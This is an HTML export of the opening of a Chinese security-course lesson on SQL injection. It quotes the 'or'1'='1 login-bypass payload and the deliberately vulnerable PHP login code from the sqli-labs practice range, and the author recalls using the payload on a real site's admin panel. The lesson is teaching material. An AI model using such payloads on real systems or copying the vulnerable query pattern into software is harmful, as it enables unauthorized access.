@@ -1,0 +1,1514 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>06 | SQL 注入：小心数据库被拖走（上）</title>
+<style type="text/css">.hljs{display:block;overflow-x:auto;padding:.5em;color:#383a42;background:#fafafa}.hljs-comment,.hljs-quote{color:#a0a1a7;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#a626a4}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e45649}.hljs-literal{color:#0184bb}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#50a14f}.hljs-built_in,.hljs-class .hljs-title{color:#c18401}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#986801}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#4078f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}/*# sourceURL=/Users/young/Documents/Codes/Fun/lagou/public/atom-one-light.min.css*/</style><style type="text/css">/*
+ * Copyright (C) 2018 Drake, Inc.
+ *
+ * Licensed under the Apache License, Version 2.0 (the "License");
+ * you may not use this file except in compliance with the License.
+ * You may obtain a copy of the License at
+ *
+ * http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+:root {
+    --monospace: "JetBrains Mono", HYZhengYuan, "Fira Code", Menlo, "Ubuntu Mono", Consolas; /*code font*/
+    --text-font: var(--monospace); /*default font*/
+    --title-font: var(--monospace); /*title font*/
+
+    --text-color: #333333;
+    --bg-color: #ffffff;
+    --control-text-color: var(--text-color);
+    --meta-content-color: var(--text-color);
+    --active-file-border-color: var(--drake-accent);
+    --rawblock-edit-panel-bd: var(--code-block-bg-color);
+    --item-hover-bg-color: #E5E5E596;
+    --active-file-bg-color: var(--item-hover-bg-color);
+
+    --drake-accent: #e95f59;
+    --drake-highlight: #d63200;
+    --a-color: #036aca;
+    --variable-color: var(--drake-highlight);
+    --outline-active-color: var(--a-color);
+    --code-block-bg-color: #2b2b2b;
+    --code-block-color: #A9B7C6;
+    --title-color: #135ce0;
+    --blockquote-border-color: #b2aec5;
+    --blockquote-color: #595959;
+    --blockquote-bg-color: #fff9f9;
+    --strong-color: var(--title-color);
+    --h2-underline-color: var(--title-color);
+    --horizontal-divider-color: var(--title-color);
+    --height-light-color: var(--drake-highlight);
+    --height-light-border-color: var(--drake-highlight);
+    --yaml-color: #777777;
+    --yaml-bg-color: #f7f7f7;
+    --footnotes-bg-color: #3c3d3e;
+    --footnotes-highlight: #FFD760;
+    --table-border-color: #dfe2e5;
+    --table-header-bg-color: #f6f8fa;
+    --table-bg-color: var(--bg-color);
+    --table-n2-bg-color: #f6f8fa;
+    --input-bg-color: var(--item-hover-bg-color);
+    --btn-hover-bg-color: var(--item-hover-bg-color);
+    --checkbox-checked: url("data:image/svg+xml,%3Csvg class='icon' viewBox='0 0 1024 1024' xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Cpath d='M425.984 726.016l384-384-59.99-61.995-324.01 324.011-152.021-152.021L213.973 512zm384-598.016q36.01 0 61.013 25.984T896 213.974v596.01q0 34.005-25.003 59.99t-61.013 25.983h-596.01q-36.011 0-61.014-25.984t-25.003-59.989v-596.01q0-34.006 25.003-59.99T213.973 128h596.011z' fill='%2365b73b'/%3E%3C/svg%3E");
+    --checkbox-unchecked: url("data:image/svg+xml,%3Csvg class='icon' viewBox='0 0 1024 1024' xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Cpath d='M810.667 213.333v597.334H213.333V213.333h597.334m0-85.333H213.333C166.4 128 128 166.4 128 213.333v597.334C128 857.6 166.4 896 213.333 896h597.334C857.6 896 896 857.6 896 810.667V213.333C896 166.4 857.6 128 810.667 128z' fill='%23333333'/%3E%3C/svg%3E");
+}
+
+html {
+    font-size: 15px;
+}
+
+body {
+    font-family: var(--text-font) !important;
+    color: var(--text-color);
+    -webkit-font-feature-settings: "liga" on, "calt" on;
+    -webkit-font-smoothing: subpixel-antialiased;
+    text-rendering: optimizeLegibility;
+    letter-spacing: 0;
+    margin: 0;
+    overflow-x: hidden;
+    line-height: 1.8rem;
+}
+
+img {
+    max-width: 100%;
+}
+
+#write {
+    background-image: linear-gradient(
+            90deg
+            ,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(
+            1turn
+            ,rgba(60,10,30,.04) 3%,transparent 0);
+    background-size: 20px 20px;
+    background-position: 50%;
+}
+
+/*code block*/
+#write .md-fences {
+    font-size: 1rem;
+    padding: 0.5rem !important;
+    border-radius: 2px;
+    word-wrap: normal;
+    background-color: var(--code-block-bg-color);
+    color: var(--code-block-color);
+    border: none;
+}
+
+/*code snippet*/
+#write code, tt {
+    border-radius: 2px;
+    color: var(--drake-highlight);
+}
+
+/*variable*/
+var {
+    color: var(--variable-color);
+    font-weight: bold;
+}
+
+/*raw block*/
+.md-rawblock-control:not(.md-rawblock-tooltip) {
+    border-radius: 2px 0 2px 2px;
+    padding: 0.2rem !important;
+}
+.md-rawblock:hover > .md-rawblock-container {
+    background: none;
+}
+.md-rawblock-input {
+    font-size: 1rem;
+}
+.md-rawblock-tooltip-btn:hover {
+    background: none;
+}
+.md-rawblock:hover > .md-rawblock-tooltip {
+    border-radius: 2px 2px 0 0;
+    margin-bottom: 2px !important;
+}
+.md-rawblock-tooltip.md-rawblock-control {
+    border-radius: 2px 2px 0 0;
+    color: var(--code-block-color);
+}
+.md-rawblock-tooltip-name {
+    color: var(--code-block-color);
+    opacity: 1;
+}
+
+/*quote block*/
+blockquote:before {
+    display: block;
+    position: absolute;
+    content: '';
+    width: 4px;
+    left: 0;
+    top: 0;
+    height: 100%;
+    background-color: var(--blockquote-border-color);
+    border-radius: 2px;
+}
+
+blockquote {
+    color: var(--blockquote-color);
+    border-radius: 2px;
+    padding: 10px 16px;
+    background-color: var(--blockquote-bg-color);
+    position: relative;
+    border-left: none;
+}
+
+#write strong {
+    color: var(--strong-color);
+    font-weight: bold;
+}
+#write blockquote strong {
+    color: var(--blockquote-color);
+}
+
+/*link*/
+#write a {
+    color: var(--a-color);
+    text-decoration: none;
+}
+#write a .md-plain, .md-htmlblock-container a:hover {
+    border-bottom: .1rem solid var(--a-color);
+}
+[md-inline=link] a {
+    margin: 0 .2rem;
+}
+a:any-link {
+    color: var(--a-color);
+}
+
+img {
+    border-left: none;
+    border-right: none;
+    vertical-align: baseline;
+    border-radius: 2px;
+}
+
+#write {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 20px 30px 100px;
+}
+#typora-source .CodeMirror-lines {
+    max-width: 1200px;
+}
+
+#write p {
+    word-spacing: .05rem;
+}
+
+#write > ul:first-child,
+#write > ol:first-child {
+    margin-top: 30px;
+}
+
+body > *:first-child {
+    margin-top: 0 !important;
+}
+
+body > *:last-child {
+    margin-bottom: 0 !important;
+}
+
+h1,
+h2,
+h3,
+h4,
+h5,
+h6 {
+    font-family: var(--title-font);
+    position: relative;
+    margin-top: 2rem;
+    margin-bottom: 1rem;
+    font-weight: bold;
+    cursor: text;
+    color: var(--title-color);
+}
+
+h3.md-focus:before, h4.md-focus:before, h5.md-focus:before, h6.md-focus:before {
+    visibility: hidden;
+}
+
+h1 {
+    font-size: 1.6rem;
+    text-align: center;
+    margin-top: 0;
+}
+
+h2.md-end-block.md-heading {
+    font-size: 1.6rem;
+    display: inline-block;
+}
+
+h2.md-end-block.md-heading:after {
+    display: block;
+    content: '';
+    height: 2px;
+    margin-top: 4px;
+    background-color: var(--h2-underline-color);
+    border-radius: 2px;
+}
+
+h3 {
+    font-size: 1.4rem;
+}
+
+h4 {
+    font-size: 1.2rem;
+}
+
+h5 {
+    font-size: 1rem;
+}
+
+h6 {
+    font-size: 1rem;
+}
+
+h1:hover a.anchor,
+h2:hover a.anchor,
+h3:hover a.anchor,
+h4:hover a.anchor,
+h5:hover a.anchor,
+h6:hover a.anchor {
+    text-decoration: none;
+}
+
+h1 tt,
+h1 code {
+    font-size: inherit !important;
+}
+
+h2 tt,
+h2 code {
+    font-size: inherit !important;
+}
+
+h3 tt,
+h3 code {
+    font-size: inherit !important;
+}
+
+h4 tt,
+h4 code {
+    font-size: inherit !important;
+}
+
+h5 tt,
+h5 code {
+    font-size: inherit !important;
+}
+
+h6 tt,
+h6 code {
+    font-size: inherit !important;
+}
+
+blockquote,
+ul,
+ol,
+dl,
+table {
+    margin: 0.8em 0;
+}
+p {
+    margin: 0;
+}
+
+li > ol,
+li > ul {
+    margin: 0 0;
+}
+
+hr {
+    height: 2px;
+    padding: 0;
+    margin: 16px 0;
+    background-color: var(--horizontal-divider-color);
+    border: 0 none;
+    overflow: hidden;
+    box-sizing: content-box;
+}
+
+body > h2:first-child {
+    margin-top: 0;
+    padding-top: 0;
+}
+
+body > h1:first-child {
+    margin-top: 0;
+    padding-top: 0;
+}
+
+body > h1:first-child + h2 {
+    margin-top: 0;
+    padding-top: 0;
+}
+
+body > h3:first-child,
+body > h4:first-child,
+body > h5:first-child,
+body > h6:first-child {
+    margin-top: 0;
+    padding-top: 0;
+}
+
+a:first-child h1,
+a:first-child h2,
+a:first-child h3,
+a:first-child h4,
+a:first-child h5,
+a:first-child h6 {
+    margin-top: 0;
+    padding-top: 0;
+}
+
+h1 p,
+h2 p,
+h3 p,
+h4 p,
+h5 p,
+h6 p {
+    margin-top: 0;
+}
+
+li p.first {
+    display: inline-block;
+}
+
+ul, ol {
+    padding-inline-start: 2em;
+}
+
+ul:first-child,
+ol:first-child {
+    margin-top: 0;
+}
+
+ul:last-child,
+ol:last-child {
+    margin-bottom: 0;
+}
+
+table {
+    padding: 0;
+    word-break: initial;
+    background-color: var(--table-bg-color);
+}
+table tr {
+    border-top: .1em solid var(--table-border-color);
+    margin: 0;
+    padding: 0;
+}
+table th {
+    font-weight: bold;
+    border: .1em solid var(--table-border-color);
+    border-bottom: 0;
+    margin: 0;
+    padding: 6px 13px;
+}
+table td {
+    border: .1em solid var(--table-border-color);
+    margin: 0;
+    padding: 6px 13px;
+}
+table thead {
+    background-color: var(--table-header-bg-color);
+}
+table tr:nth-child(2n) {
+    background-color: var(--table-n2-bg-color);
+}
+table tr th:first-child,
+table tr td:first-child {
+    margin-top: 0;
+}
+table tr th:last-child,
+table tr td:last-child {
+    margin-bottom: 0;
+}
+
+#write em {
+    padding: 0 5px 0 2px;
+}
+
+/* height light */
+#write mark {
+    border: .1em solid var(--height-light-border-color);
+    color: var(--height-light-color);
+    background-color: transparent;
+    padding: .1rem .5rem;
+    border-radius: 2rem;
+    margin: 0 .2rem;
+    font-size: .95rem;
+}
+
+/*shortcut*/
+kbd {
+    border: .1em solid #5b5b5e;
+    background: transparent;
+    color: var(--text-color);
+    margin: 0 .4rem;
+    font-size: .95rem;
+    padding: .3em .4em;
+    border-radius: .4em;
+    vertical-align: top;
+    box-shadow: .1em .1em .2em rgba(0, 0, 0, 0.3);
+}
+
+#write del {
+    padding: 1px 2px;
+}
+
+.md-task-list-item > input {
+    margin-left: -1.3em;
+}
+
+@media print {
+    html {
+        font-size: 12px;
+    }
+
+    table,
+    pre {
+        page-break-inside: avoid;
+    }
+
+    pre {
+        word-wrap: break-word;
+    }
+}
+
+/*YAML*/
+#write pre.md-meta-block {
+    padding: 1rem;
+    font-size: 1rem;
+    background-color: var(--yaml-bg-color);
+    border: 0;
+    border-radius: 2px;
+    color: var(--yaml-color);
+    margin-top: 0 !important;
+}
+
+.mathjax-block > .code-tooltip {
+    bottom: .375rem;
+}
+
+#write > h3.md-focus:before {
+    left: -1.5625rem;
+    top: .375rem;
+}
+
+#write > h4.md-focus:before {
+    left: -1.5625rem;
+    top: .285714286rem;
+}
+
+#write > h5.md-focus:before {
+    left: -1.5625rem;
+    top: .285714286rem;
+}
+
+#write > h6.md-focus:before {
+    left: -1.5625rem;
+    top: .285714286rem;
+}
+
+.md-image > .md-meta {
+    border-radius: 2px;
+    font-family: initial;
+    padding: 2px 0 0 4px;
+    color: inherit;
+}
+
+.md-tag {
+    color: inherit;
+}
+
+.md-toc {
+    margin-top: 20px;
+    padding-bottom: 20px;
+}
+
+.typora-quick-open-item {
+    font-size: 1rem !important;
+    height: 50px;
+    padding-left: 8px;
+    padding-top: 4px;
+    padding-bottom: 4px;
+}
+
+#typora-quick-open {
+    box-shadow: 0 0 8px #00000045;
+    padding: 0;
+}
+
+.ty-quick-open-category.ty-has-prev .ty-quick-open-category-title {
+    border-top: none;
+}
+
+#typora-quick-open-input {
+    margin: 8px;
+    box-shadow: none;
+    border-radius: 2px;
+}
+
+#typora-quick-open-input input {
+    font-size: 1rem;
+    box-shadow: none;
+    padding-top: 2px;
+    padding-left: 10px;
+    padding-right: 10px;
+    line-height: 32px;
+    max-height: 32px;
+    border: none;
+}
+
+.modal-dialog#typora-quick-open {
+    border-radius: 8px;
+}
+
+.ty-quick-open-category-title {
+    padding-left: 8px;
+    color: #BEBEBE;
+    font-size: 0.8rem;
+    margin-bottom: 4px;
+}
+
+.typora-quick-open-item-path {
+    font-size: 0.8rem;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+    margin-top: 1px;
+}
+
+/*search input*/
+.form-control {
+    border: none;
+    border-radius: 2px;
+    box-shadow: none;
+}
+
+#md-searchpanel .btn {
+    border-radius: 2px;
+}
+
+#search-panel-replaceall-btn {
+    padding-right: 5px !important;
+    text-align: center !important;
+}
+
+#search-panel-replace-btn {
+    text-align: center !important;
+}
+
+#md-searchpanel input {
+    background: var(--input-bg-color);
+    border-radius: 2px;
+}
+
+.searchpanel-search-option-btn {
+    border-radius: 2px;
+    border: none;
+    background: transparent;
+    color: var(--text-color);
+}
+
+.searchpanel-search-option-btn.active {
+    background: var(--text-color);
+    color: var(--bg-color);
+}
+
+.form-control:focus {
+    box-shadow: none;
+}
+
+#md-notification:before {
+    top: 10px;
+}
+
+/** focus mode */
+.on-focus-mode blockquote {
+    border-left-color: rgba(85, 85, 85, 0.12);
+}
+
+header,
+.context-menu,
+.megamenu-content,
+footer {
+    font-family: initial;
+}
+
+/*sidebar*/
+.file-node-content:hover .file-node-icon,
+.file-node-content:hover .file-node-open-state {
+    visibility: visible;
+}
+
+#typora-sidebar {
+    font-size: 1.1rem;
+}
+
+.sidebar-tabs {
+    border-bottom: none;
+}
+
+.file-list-item-summary, .file-list-item-parent-loc, .file-list-item-time, .file-list-item-summary {
+    font-size: 0.9rem !important;
+    font-family: var(--text-font);
+}
+
+.file-list-item-file-ext-part {
+    display: none;
+}
+
+.outline-item {
+    font-size: 1rem;
+}
+
+/*footnotes mark*/
+#write .md-footnote {
+    background-color: inherit;
+    color: var(--drake-highlight);
+    font-size: 0.9rem;
+    border-radius: 0.9rem;
+    padding-left: 0;
+}
+
+#write .md-footnote:before {
+    content: "[";
+}
+
+#write .md-footnote:after {
+    content: "]";
+}
+
+/*footnotes content*/
+.md-hover-tip .code-tooltip-content {
+    border-radius: 2px;
+}
+
+/*footnotes title*/
+span.md-def-name {
+    padding-right: 3ch;
+    padding-left: 0;
+    position: relative;
+    font-weight: normal;
+}
+
+/*footnotes desc*/
+.footnotes {
+    font-size: 1rem;
+    font-weight: normal;
+    color: var(--text-color);
+    position: relative;
+}
+
+/*footnotes tooltip text*/
+.code-tooltip-content .md-plain {
+    font-size: 0.9rem;
+    font-family: inherit;
+}
+
+.code-tooltip-content code {
+    padding: 0 2px;
+    font-family: inherit;
+    color: var(--footnotes-highlight);
+    background-color: inherit;
+}
+
+.code-tooltip-content a {
+    color: var(--footnotes-highlight);
+}
+
+div.code-tooltip-content {
+    box-shadow: 0 0 8px #00000045;
+    background: var(--footnotes-bg-color);
+}
+
+.footnotes {
+    opacity: 1;
+}
+
+.md-def-name:after {
+    content: ". ^";
+    color: var(--text-color);
+}
+
+.md-def-footnote .md-def-name:before {
+    content: "";
+    color: var(--text-color);
+    position: absolute;
+}
+
+.md-def-name:before {
+    content: "";
+    color: var(--text-color);
+    position: absolute;
+}
+
+.md-content.md-url, .md-def-content.md-def-url.md-auto-disp {
+    text-decoration: none;
+    border-bottom: .1rem solid var(--text-color);
+}
+
+.CodeMirror-scroll::-webkit-scrollbar {
+    display: none;
+}
+
+.file-list-item-summary {
+    font-size: 1em;
+}
+
+.pin-outline #outline-content .outline-active strong, .pin-outline .outline-active {
+    font-weight: 500;
+    color: var(--outline-active-color);
+}
+
+.file-list-item.active {
+    border-left: 4px solid var(--drake-accent);
+}
+
+#md-searchpanel .btn:not(.close-btn):hover {
+    box-shadow: none;
+    background: var(--btn-hover-bg-color);
+}
+
+/*checkbox*/
+#write input[type=checkbox] {
+    opacity: 0;
+    height: 1.6rem;
+    width: 1.6rem;
+    margin-left: -2em;
+    margin-top: 0;
+    top: 0;
+}
+
+#write .ul-list li.md-task-list-item.task-list-done::before {
+    content: "";
+    background: var(--checkbox-checked) 0 0 no-repeat;
+    background-size: 100%;
+    display: inline-block;
+    position: absolute;
+    height: 1.6rem;
+    width: 1.6rem;
+    margin-left: -2em;
+}
+
+#write .ul-list li.md-task-list-item.task-list-not-done::before {
+    content: "";
+    background: var(--checkbox-unchecked) 0 0 no-repeat;
+    background-size: 100%;
+    display: inline-block;
+    position: absolute;
+    height: 1.6rem;
+    width: 1.6rem;
+    margin-left: -2em;
+}
+
+/*insert table*/
+.btn {
+    border-radius: 2px;
+}
+
+.modal-content {
+    border-radius: 8px;
+}
+
+.btn-primary:hover, .btn-primary:active {
+    background-color: var(--btn-hover-bg-color);
+    color: var(--drake-highlight);
+}
+
+.btn-primary {
+    background-color: transparent;
+    color: var(--drake-highlight);
+}
+
+.btn-default {
+    background-color: transparent;
+}
+
+.btn:active {
+    box-shadow: none;
+    border-color: transparent;
+}
+
+.modal-footer {
+    border-top: none;
+}
+
+#table-insert-col, #table-insert-row {
+    background: var(--input-bg-color);
+    border-radius: 2px;
+}
+
+/*preference panel*/
+#megamenu-content {
+    background-image: none !important;
+    background-color: var(--bg-color);
+}
+#top-titlebar {
+    height: inherit;
+    background-color: var(--bg-color);
+}
+#megamenu-menu-sidebar {
+    background-color: var(--bg-color);
+    color: var(--text-color);
+}
+.long-btn {
+    width: inherit;
+    min-width: 300px;
+    border: 1px solid var(--text-color);
+    border-radius: 6px;
+}
+.megamenu-menu-panel h1 {
+    margin-bottom: 3rem;
+    text-align: left;
+}
+.megamenu-menu-panel h1, .megamenu-menu-panel h2 {
+    font-weight: normal;
+}
+#recent-file-panel-search-input {
+    height: 45px;
+    border: none;
+    border-bottom: 1px solid var(--text-color);
+    padding-left: 8px;
+}
+#recent-file-panel-search-input::placeholder {
+    color: var(--text-color);
+    opacity: .5;
+}
+.megamenu-menu-header {
+    border-bottom: none;
+}
+#recent-file-panel-action-btn {
+    background: none;
+    border: none;
+}
+#recent-file-panel-action-btn-container {
+    float: none;
+    display: inline-block;
+}
+#top-titlebar .toolbar-icon.btn.hover, #top-titlebar .toolbar-icon.btn:hover {
+    background-color: var(--btn-hover-bg-color);
+    color: var(--text-color);
+}
+.megamenu-menu-panel .btn:hover {
+    background-color: var(--btn-hover-bg-color) !important;
+    color: var(--text-color);
+}
+#recent-file-panel tbody tr:nth-child(2n-1),
+.megamenu-menu-panel table thead,
+.megamenu-menu-panel table tr {
+    background-color: transparent;
+}
+.megamenu-menu-panel table {
+    font-weight: normal;
+}
+#megamenu-back-btn {
+    color: var(--text-color);
+    border: 1px solid var(--text-color);
+}
+.megamenu-menu-header #megamenu-menu-header-title {
+    color: var(--text-color);
+}
+header, .context-menu, .megamenu-content, footer {
+    font-family: var(--text-font);
+}
+.ty-preferences select {
+    padding-left: 2px;
+}
+.preference-item-hint {
+    font-size: 14px;
+}
+a.ty-link {
+    color: var(--a-color);
+    margin: 0 .2rem;
+}
+
+/**
+    code render
+    Name: IntelliJ IDEA darcula theme
+    From IntelliJ IDEA by JetBrains
+ */
+.cm-s-inner.CodeMirror {
+    background: var(--code-block-bg-color);
+    color: var(--code-block-color);
+}
+
+.cm-s-inner span.cm-meta {
+    color: #BBB529;
+}
+
+.cm-s-inner span.cm-number {
+    color: #6897BB;
+}
+
+.cm-s-inner span.cm-keyword {
+    color: #CC7832;
+}
+
+.cm-s-inner span.cm-def {
+    color: #FFD760;
+}
+
+.cm-s-inner span.cm-variable {
+    color: var(--code-block-color);
+}
+
+.cm-s-inner span.cm-variable-2 {
+    color: var(--code-block-color);
+}
+
+.cm-s-inner span.cm-variable-3 {
+    color: #9876AA;
+}
+
+.cm-s-inner span.cm-type {
+    color: #AABBCC;
+}
+
+.cm-s-inner span.cm-property {
+    color: #FFC66D;
+}
+
+.cm-s-inner span.cm-operator {
+    color: var(--code-block-color);
+}
+
+.cm-s-inner span.cm-string {
+    color: #6A8759;
+}
+
+.cm-s-inner span.cm-string-2 {
+    color: #6A8759;
+}
+
+.cm-s-inner span.cm-comment {
+    color: #787878;
+}
+
+.cm-s-inner span.cm-link {
+    color: #CC7832;
+}
+
+.cm-s-inner span.cm-atom {
+    color: #CC7832;
+}
+
+.cm-s-inner span.cm-error {
+    color: #BC3F3C;
+}
+
+.cm-s-inner span.cm-tag {
+    color: #E8BF6A;
+}
+
+.cm-s-inner span.cm-quote {
+    color: #a6e22e;
+}
+
+.cm-s-inner span.cm-attribute {
+    color: #9876AA;
+}
+
+.cm-s-inner span.cm-qualifier {
+    color: #6A8759;
+}
+
+.cm-s-inner span.cm-bracket {
+    color: #E8BF6A;
+}
+
+.cm-s-inner span.cm-builtin {
+    color: #FF9E59;
+}
+
+.cm-s-inner span.cm-special {
+    color: #FF9E59;
+}
+
+.cm-s-inner span.cm-matchhighlight {
+    color: #FFFFFF;
+    background-color: rgba(50, 89, 48, .7);
+    font-weight: normal;
+}
+
+.cm-s-inner span.cm-searching {
+    color: #FFFFFF;
+    background-color: rgba(61, 115, 59, .7);
+    font-weight: normal;
+}
+
+.cm-s-inner .CodeMirror-gutters {
+    border-right: 1px solid rgba(120, 120, 120, 0.3);
+}
+
+.cm-s-inner .CodeMirror-linenumber {
+    color: #585b5d;
+}
+
+.cm-s-inner .CodeMirror-matchingbracket {
+    background-color: #3B514D;
+    color: #FFEF28 !important;
+}
+
+.cm-s-inner .CodeMirror-selected {
+    background: #214283 !important;
+}
+
+.cm-s-inner .CodeMirror-selectedtext {
+    background: #214283 !important;
+}
+
+.cm-s-typora-default .CodeMirror-selectedtext {
+    background: var(--select-text-bg-color) !important;
+}
+
+.cm-overlay.CodeMirror-selectedtext {
+    background: var(--select-text-bg-color) !important;
+}
+
+.cm-s-inner div.CodeMirror-cursor {
+    border-left: 1px solid var(--code-block-color);
+}/*# sourceURL=/Users/didi/Documents/Codes/Fun/lagou/public/drake-juejin.css*/</style></head>
+<body>
+  <div id="write"><h1>06 | SQL 注入：小心数据库被拖走（上）</h1><p data-nodeid="1829" class="">你好，我是赢少良。我们现在来到了 SQL 注入的学习，这里我会主要介绍 SQL 注入漏洞的产生原理、利用、检测和防御。相信学完后，你就知道：</p>
+<ul data-nodeid="1830">
+<li data-nodeid="1831">
+<p data-nodeid="1832">为什么 'or'1'='1 是个万能密码；</p>
+</li>
+<li data-nodeid="1833">
+<p data-nodeid="1834">攻击者会如何进一步利用漏洞发动攻击窃取数据库；</p>
+</li>
+<li data-nodeid="1835">
+<p data-nodeid="1836">开发如何检测和防御 SQL 注入漏洞。</p>
+</li>
+</ul>
+<p data-nodeid="1837">这一讲，我主要讲解 SQL 注入与数据库拖库问题。</p>
+<p data-nodeid="1838">十几年前，我在网上偶然间看到一篇文章，号称有可登录任意网站管理后台的万能密码，只要在用户名和密码中均输入 'or'1'='1（注意单引号的使用）即可登录后台。当时感觉特别神奇，也有点质疑，于是，我通过 Google 搜索了几个网站后台，没想到有一个真的登录进去了，还可以直接修改主页内容。我没有动，给管理员留言后就退出了。</p>
+<p data-nodeid="1839">后来，从网友那得知有个叫“明小子”的工具，专门用于检测和利用 SQL 注入漏洞，使用起来非常“傻瓜”。如果你很早接触过安全，相信对下面的界面图再熟悉不过了。这是我第一次听说“SQL 注入”这个词，知道了它属于 Web 漏洞中非常常见的一种漏洞。</p>
+<p data-nodeid="1840"><img src="https://s0.lgstatic.com/i/image2/M01/03/A4/CgpVE1_gPOeAI7xSAABTJIYxcfE254.png" alt="Drawing 0.png" data-nodeid="2035"></p>
+<div data-nodeid="1841"><p style="text-align:center">图 1：“明小子”工具</p></div>
+<p data-nodeid="1842">目前 PHP + MySQL + Linux 一直是网站搭建的主流环境，我们也是在此环境下演示的。其他数据库系统不再介绍，你可自行搜索相关资料拓展学习。同时，为了简化环境搭建的工作，推荐使用 Docker 安装 sqli-labs 作为靶场来实践，具体安装方法可参考《<a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=585&amp;decorateId=396aca4423074fd39a878fc22e9ae663&amp;_channel_track_key=IIxiTicP#/detail/pc?id=5970" data-nodeid="2041">03 | 靶场：搭建漏洞练习环境</a>》中的内容。</p>
+<h3 data-nodeid="1843">SQL 注入产生的原因</h3>
+<p data-nodeid="1844">以 sqli-labs 第 11 题为例，该题模拟后台登录页面，其 Username 与 Password 均存在 SQL 注入漏洞。该题的 PHP 源码可直接点击 <a href="https://github.com/Audi-1/sqli-labs/tree/master/Less-11" data-nodeid="2047">Github 链接</a>查看，也可以进 Docker 容器内查看。</p>
+<p data-nodeid="1845">为方便理解，我把 PHP 源码贴出来，并加上了注释：</p>
+<pre class="lang-php hljs" data-nodeid="1846"><code data-language="php"><span class="hljs-meta">&lt;?php</span>
+	<span class="hljs-comment">//including the Mysql connect parameters.</span>
+	<span class="hljs-keyword">include</span>(<span class="hljs-string">"../sql-connections/sql-connect.php"</span>);
+	error_reporting(<span class="hljs-number">0</span>);
+	
+	<span class="hljs-comment">// take the variables</span>
+	<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'uname'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'passwd'</span>]))
+	{
+		$uname=$_POST[<span class="hljs-string">'uname'</span>];    <span class="hljs-comment">// 用户输入的用户名</span>
+		$passwd=$_POST[<span class="hljs-string">'passwd'</span>];  <span class="hljs-comment">// 用户输入的密码</span>
+		<span class="hljs-comment">//logging the connection parameters to a file for analysis.</span>
+		$fp=fopen(<span class="hljs-string">'result.txt'</span>,<span class="hljs-string">'a'</span>);
+		fwrite($fp,<span class="hljs-string">'User Name:'</span>.$uname);
+		fwrite($fp,<span class="hljs-string">'Password:'</span>.$passwd.<span class="hljs-string">"\n"</span>);
+		fclose($fp);
+	
+		<span class="hljs-comment">// connectivity </span>
+        <span class="hljs-comment">// 未经过滤，直接将用户输入带入 SQL 语句进行查询，最终导致 SQL 注入</span>
+		@$sql=<span class="hljs-string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;
+		$result=mysql_query($sql);
+		$row = mysql_fetch_array($result);
+	
+		<span class="hljs-keyword">if</span>($row)
+		{
+            <span class="hljs-comment">// 查询到数据就登录成功</span>
+	  		<span class="hljs-comment">//echo '&lt;font color= "#0000ff"&gt;';			</span>
+	  		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;
+
+"</span>;
+			<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;
+			<span class="hljs-comment">//echo " You Have successfully logged in\n\n " ;</span>
+			<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font size="3" color="#0000ff"&gt;'</span>;	
+			<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;
+
+"</span>;
+			<span class="hljs-keyword">echo</span> <span class="hljs-string">'Your Login name:'</span>. $row[<span class="hljs-string">'username'</span>];
+			<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;
+
+"</span>;
+			<span class="hljs-keyword">echo</span> <span class="hljs-string">'Your Password:'</span> .$row[<span class="hljs-string">'password'</span>];
+			<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;
+
+"</span>;
+			<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;
+			<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;
+
+"</span>;
+			<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;
+
+"</span>;
+			<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src="../images/flag.jpg"  /&gt;'</span>;	
+			
+	  		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;
+	  	}
+		<span class="hljs-keyword">else</span>
+		{
+            <span class="hljs-comment">// 登录失败</span>
+			<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;
+			<span class="hljs-comment">//echo "Try again looser";</span>
+			print_r(mysql_error());
+			<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;
+			<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;
+			<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;
+			<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src="../images/slap.jpg" /&gt;'</span>;	
